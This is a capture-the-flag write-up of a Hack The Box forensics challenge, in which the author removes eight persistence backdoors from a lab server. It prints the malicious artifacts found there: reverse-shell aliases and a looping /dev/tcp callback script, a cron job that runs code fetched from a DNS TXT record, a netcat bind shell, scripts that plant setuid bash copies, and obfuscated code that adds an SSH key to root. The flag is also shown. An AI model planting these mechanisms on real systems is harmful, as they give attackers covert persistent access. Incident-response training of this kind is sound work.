# Forensics

## Description

Hackers made it onto one of our production servers 😅. We've isolated it from the internet until we can clean the machine up. The IR team reported eight difference backdoors on the server, but didn't say what they were and we can't get in touch with them. We need to get this server back into prod ASAP - we're losing money every second it's down. Please find the eight backdoors (both remote access and privilege escalation) and remove them. Once you're done, run /root/solveme as root to check. You have SSH access and sudo rights to the box with the connections details attached below.

username: **user**
password: **hackthebox**
## Solution

First backdoor is found in user's home directory, remove it.

```bash
➜ ssh user@94.237.56.229 -p 50833
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ ls -alh
total 1.2M
drwxr-xr-x 1 user user 4.0K Sep 29 11:12 .
drwxr-xr-x 1 root root 4.0K May 14  2021 ..
-rwsr-xr-x 1 root root 1.2M May 14  2021 .backdoor
-rw-r--r-- 1 user user  220 Feb 25  2020 .bash_logout
-rw-rw-r-- 1 root root 3.8K Apr 23  2021 .bashrc
drwx------ 2 user user 4.0K Sep 29 11:12 .cache
-rw-r--r-- 1 user user  807 Feb 25  2020 .profile
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ file .backdoor
.backdoor: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a6cb40078351e05121d46daa768e271846d5cc54, for GNU/Linux 3.2.0, stripped
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ rm .backdoor -f
```

Find SUID binaries:
```bash
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/opt$ sudo find / -perm -4000 -ls 2>/dev/null
  5399427   9388 -rwsr-xr-x   1 root     root      9612512 May  7  2021 /root/solveme
  5376418     88 -rwsr-xr-x   1 root     root        88464 May 28  2020 /usr/bin/gpasswd
  5376491     68 -rwsr-xr-x   1 root     root        68208 May 28  2020 /usr/bin/passwd
  5376480     44 -rwsr-xr-x   1 root     root        44784 May 28  2020 /usr/bin/newgrp
  5376351     84 -rwsr-xr-x   1 root     root        85064 May 28  2020 /usr/bin/chfn
  5376357     52 -rwsr-xr-x   1 root     root        53040 May 28  2020 /usr/bin/chsh
  5376554     68 -rwsr-xr-x   1 root     root        67816 Jul 21  2020 /usr/bin/su
  5376475     56 -rwsr-xr-x   1 root     root        55528 Jul 21  2020 /usr/bin/mount
  5376579     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount
  5399392   1156 -rwsr-xr-x   1 root     root      1183448 Jun 18  2020 /usr/bin/dlxcrw
  5399374   1156 -rwsr-xr-x   1 root     root      1183448 Jun 18  2020 /usr/bin/mgxttm
  5380225    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo
  5399383   1156 -rwsr-xr-x   1 root     root      1183448 Jun 18  2020 /usr/sbin/afdluk
  5399308    128 -rwsr-xr-x   1 root     root       129816 May 14  2021 /usr/sbin/ppppd
  5383029    464 -rwsr-xr-x   1 root     root       473576 Mar  9  2021 /usr/lib/openssh/ssh-keysign
  5382800     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

`dlxcrw`, `mgxttm`, `afdluk` have same md5sum, meaning they are the same files. The names seem randomly generated so 
```bash
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/opt$ sudo find / -perm -4000 -exec md5sum {} \; 2>/dev/null | sort
0bc454a7b7192112e1fa0b9737c5b257  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
1e6b1c887c59a315edb7eb9a315fc84c  /usr/sbin/ppppd
2a1758ef6cf863f285bc8a918edbc0be  /usr/bin/umount
4f7c73f1c21df45c682bb0ce2caacda2  /usr/bin/passwd
7063c3930affe123baecd3b340f1ad2c  /usr/bin/dlxcrw
7063c3930affe123baecd3b340f1ad2c  /usr/bin/mgxttm
7063c3930affe123baecd3b340f1ad2c  /usr/sbin/afdluk
71beb9e0c6adc354a426b5b8dcc88249  /usr/bin/su
86e7069c7fff09356181e34439da085e  /usr/bin/chfn
8c03ef24873c7dc08677c6867522d8ca  /root/solveme
92b20aa8b155ecd3ba9414aa477ef565  /usr/bin/mount
b18770f47f281b6e9ff0d52307386914  /usr/lib/openssh/ssh-keysign
d361437c8ae438bbeda50bdce827af7d  /usr/bin/newgrp
dbd2e316b6c387bf8c1a68a64a89ec8f  /usr/bin/gpasswd
e1bb2ec4e91e77e8bf7d21eda01c6da5  /usr/bin/chsh
eb8c10001fe28b9c4c2e42b96347f6db  /usr/bin/sudo
```

`strings` display's huge chunk of binary description, which seemed like bash manual. Checking the md5sum of bash it's revealed that binaries are indeed copies of bash, but with suid bit.
```bash
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ md5sum /bin/bash
7063c3930affe123baecd3b340f1ad2c  /bin/bash
```

Remove them
```bash
sudo rm -f /usr/bin/dlxcrw
sudo rm -f /usr/bin/mgxttm
sudo rm -f /usr/sbin/afdluk
```

`ppppd` also is an odd name and I suspected since it's different from `bash` hash it must be some other shell, like `sh`
```bash
1e6b1c887c59a315edb7eb9a315fc84c  /usr/sbin/ppppd
```

Hashes match, binary is masked `/bin/sh` with suid bit.
```bash
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ md5sum /bin/sh
1e6b1c887c59a315edb7eb9a315fc84c  /bin/sh
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ sudo rm -f /usr/sbin/ppppd
```

The user has a cronjob which executes every minute
```bash
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ crontab -l
* * * * * /bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"
```

Remove cronjob backdoor
```bash
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/var/spool/cron$ crontab -r
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/var/spool/cron$ crontab -l
no crontab for user
```

`cat` is alias for reverse shell:
```bash
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ alias
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias cat='(bash -i >& /dev/tcp/172.17.0.1/443 0>&1 & disown) 2>/dev/null; cat'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'

user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ cat .bashrc
...
# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias cat='(bash -i >& /dev/tcp/172.17.0.1/443 0>&1 & disown) 2>/dev/null; cat'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi
...
```

Remove the line from `.bashrc`

Root has the same backdoor.
```bash
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ sudo vim /root/.bashrc
...
# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alertd -e /bin/bash -lnp 4444 &
...
```

`alertd` has same syntax as `nc`, remove it.
```bash
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ md5sum $(which alertd) $(which nc)
2286f0526e891796a638f3c600d86a38  /usr/bin/alertd
2286f0526e891796a638f3c600d86a38  /usr/bin/nc
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ sudo rm /usr/bin/alertd
```

```bash
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2616   608 ?        Ss   11:09   0:00 /bin/sh -c /usr/sbin/sshd -D -p 23
root           7  0.0  0.0  12184  7508 ?        S    11:09   0:00 sshd: /usr/sbin/sshd -D -p 23 [listener] 0 of 10-100 startups
root           8  0.0  0.1  13900  9004 ?        Ss   11:12   0:00 sshd: user [priv]
root          18  0.0  0.0   3984  3040 ?        S    11:12   0:00 /bin/bash /var/lib/private/connectivity-check
user          22  0.0  0.0  13900  6208 ?        S    11:12   0:00 sshd: user@pts/0
user          23  0.0  0.0   4248  3596 pts/0    Ss+  11:12   0:00 -bash
root         135  0.0  0.1  13896  8924 ?        Ss   11:29   0:00 sshd: user [priv]
root         145  0.0  0.0   3984  3048 ?        S    11:29   0:00 /bin/bash /var/lib/private/connectivity-check
user         149  0.0  0.0  13896  5896 ?        R    11:29   0:00 sshd: user@pts/1
user         150  0.0  0.0   4248  3696 pts/1    Ss   11:29   0:00 -bash
root         199  0.0  0.0   2596  2004 pts/1    S    11:34   0:00 alertd -e /bin/bash -lnp 4444
root         290  0.0  0.0   2596  1896 pts/1    S    11:38   0:00 alertd -e /bin/bash -lnp 4444
root         373  0.0  0.0   3984   244 ?        S    11:48   0:00 /bin/bash /var/lib/private/connectivity-check
root         381  0.0  0.0   3984   240 ?        S    11:49   0:00 /bin/bash /var/lib/private/connectivity-check
user         388  0.0  0.0   5904  3032 pts/1    R+   11:50   0:00 ps aux
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/var/lib/private# cat connectivity-check
#!/bin/bash

while true; do
    nohup bash -i >& /dev/tcp/172.17.0.1/443 0>&1;
    sleep 10;
done
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/var/lib/private# sudo rm connectivity-check
```

After checking `ps` again the processes are still running, kill the processes:
```bash
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/var/lib/private# sudo pkill -f connectivity-check
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/var/lib/private# sudo pkill -f alertd
```

`crontab` only showed 1 job for `user` and none for `root`, but clearly there's more.
```bash
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/etc# find cron.* -ls
  5379459      4 drwxr-xr-x   1 root     root         4096 May 14  2021 cron.d
  5376158      4 -rw-r--r--   1 root     root          201 Feb 14  2020 cron.d/e2scrub_all
  5379461      4 -rw-r--r--   1 root     root          285 Jul 16  2019 cron.d/anacron
  5379462      4 -rw-r--r--   1 root     root          191 May 14  2021 cron.d/popularity-contest
  5379460      4 -rw-r--r--   1 root     root          102 Feb 13  2020 cron.d/.placeholder
  5399367      4 drwxr-xr-x   1 root     root         4096 May 14  2021 cron.daily
  5376161      4 -rwxr-xr-x   1 root     root         1187 Sep  5  2019 cron.daily/dpkg
  5376160      4 -rwxr-xr-x   1 root     root         1478 Apr  9  2020 cron.daily/apt-compat
  5399368      4 -rwxr-xr-x   1 root     root          301 Apr 23  2021 cron.daily/access-up
  5399290      4 -rwxr-xr-x   1 root     root          199 Jan 24  2021 cron.daily/pyssh
  5379467      4 -rwxr-xr-x   1 root     root          377 Jan 21  2019 cron.daily/logrotate
  5379469      8 -rwxr-xr-x   1 root     root         4574 Jul 18  2019 cron.daily/popularity-contest
  5379466      4 -rwxr-xr-x   1 root     root          355 Dec 29  2017 cron.daily/bsdmainutils
  5379468      4 -rwxr-xr-x   1 root     root         1123 Feb 25  2020 cron.daily/man-db
  5379465      4 -rwxr-xr-x   1 root     root          311 Jul 16  2019 cron.daily/0anacron
  5379464      4 -rw-r--r--   1 root     root          102 Feb 13  2020 cron.daily/.placeholder
  5379470      4 drwxr-xr-x   2 root     root         4096 May 14  2021 cron.hourly
  5379471      4 -rw-r--r--   1 root     root          102 Feb 13  2020 cron.hourly/.placeholder
  5379472      4 drwxr-xr-x   2 root     root         4096 May 14  2021 cron.monthly
  5379474      4 -rwxr-xr-x   1 root     root          313 Jul 16  2019 cron.monthly/0anacron
  5379473      4 -rw-r--r--   1 root     root          102 Feb 13  2020 cron.monthly/.placeholder
  5379475      4 drwxr-xr-x   2 root     root         4096 May 14  2021 cron.weekly
  5379478      4 -rwxr-xr-x   1 root     root          813 Feb 25  2020 cron.weekly/man-db
  5379477      4 -rwxr-xr-x   1 root     root          312 Jul 16  2019 cron.weekly/0anacron
  5379476      4 -rw-r--r--   1 root     root          102 Feb 13  2020 cron.weekly/.placeholder
```

`access-up` is a script that created masked suid bash files:
```bash
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/etc# cat cron.daily/access-up
#!/bin/bash

DIRS=("/bin" "/sbin")
DIR=${DIRS[$[ $RANDOM % 2 ]]}

while : ; do
    NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
    [[ -f "{$DIR}/${NEW_UUID}" ]] || break
done

cp /bin/bash ${DIR}/${NEW_UUID}
touch ${DIR}/${NEW_UUID} -r /bin/bash
chmod 4755 ${DIR}/${NEW_UUID}
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/etc# rm cron.daily/access-up
```

`pyssh` seemed like a normal cronjob, but after quick analysis it's definitely malicious.
```bash
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/etc# cat cron.daily/pyssh
#!/bin/sh

VER=$(python3 -c 'import ssh_import_id; print(ssh_import_id.VERSION)')
MAJOR=$(echo $VER | cut -d'.' -f1)

if [ $MAJOR -le 6 ]; then
    /lib/python3/dist-packages/ssh_import_id_update
fi
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:/etc# cat /lib/python3/dist-packages/ssh_import_id_update
#!/bin/bash

KEY=$(echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d)
PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)

/bin/grep -q "$KEY" "$PATH" || echo "$KEY" >> "$PATH"
```

```bash
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ KEY=$(echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d)
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)
user@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~$ echo "$KEY ::: $PATH"
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRdx5Rq5+Obq66cywz5KW9ofVm0NCZ39EPDA2CJDqx1 nobody@nothing ::: /root/.ssh/authorized_keys
```

Remove last line:
```bash
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~/.ssh# vim authorized_keys
```

Remove the dist file:
```bash
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~# rm /lib/python3/dist-packages/ssh_import_id_update
```

Remove the cronjob:
```
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~# rm /etc/cron.daily/pyssh
```

`connectivity-check` backdoor was removed, but what was running it?
```bash
root         145  0.0  0.0   3984  3048 ?        S    11:29   0:00 /bin/bash /var/lib/private/connectivity-check
```

Search for string with `grep`, `/etc` is first most likely place it's in.
```bash
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~# grep '/var/lib/private/connectivity-check' /etc -Raino 2>/dev/null
/etc/update-motd.d/30-connectivity-check:3:/var/lib/private/connectivity-check
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~# cat /etc/update-motd.d/30-connectivity-check
#!/bin/bash

nohup /var/lib/private/connectivity-check &
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~# rm /etc/update-motd.d/30-connectivity-check
```

Lastly check for odd users:
```bash
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~# cat /etc/passwd | grep -v 'nologin'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
gnats:x:41:0:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/bash
user:x:1000:1000::/home/user:/bin/bash
```

[gnats](https://www.gnu.org/software/gnats/) is a legitimate software, but it's a service. Service accounts shouldn't have shell access. And also they should definitely not be part of root group.

Update shell and group:
```bash
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~# sudo vim /etc/passwd
> gnats:x:41:0:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/bash
< gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
```

Get flag:
```bash
root@ng-932570-forensicspersistence-otmee-684b4558c4-hjl2v:~# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is fully remediated
Issue 5 is fully remediated
Issue 6 is fully remediated
Issue 7 is fully remediated
Issue 8 is fully remediated

Congrats: HTB{7tr3@t_hUntIng_4TW}
```

> Flag: `HTB{7tr3@t_hUntIng_4TW}`

